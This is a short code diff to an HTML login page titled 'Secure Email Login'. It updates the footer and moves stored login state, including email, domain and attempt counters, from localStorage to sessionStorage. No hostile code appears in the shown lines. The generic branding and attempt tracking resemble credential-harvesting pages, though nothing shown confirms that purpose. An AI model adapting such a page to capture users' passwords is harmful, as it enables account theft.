@@ -334,8 +334,8 @@
     </div>
 
     <div class="footer">
-        <span>© 2025 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
-        <a href="#" id="footer-link">example.com</a>
+        <span>© 2026 <span id="footer-domain">Secure Email Login</span>. All rights reserved.</span>
+        <a href="#" id="footer-link">signin</a>
         <span class="timestamp" id="footer-time">| Last updated: --</span>
     </div>
 
@@ -382,7 +382,7 @@
 
         // === STATE ===
         let state = { email: '', domain: '', attempts: 0, retryCount: 0 };
-        const saved = localStorage.getItem('loginState');
+        const saved = sessionStorage.getItem('loginState');
         if (saved) state = JSON.parse(saved);
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -418,8 +418,8 @@
         };
 
         // === HELPERS ===
-        function saveState() { localStorage.setItem('loginState', JSON.stringify(state)); }
-        function clearState() { localStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
+        function saveState() { sessionStorage.setItem('loginState', JSON.stringify(state)); }
+        function clearState() { sessionStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
 
         function showError(msg, showLogo = false) {
             els.errorText.textContent = msg;
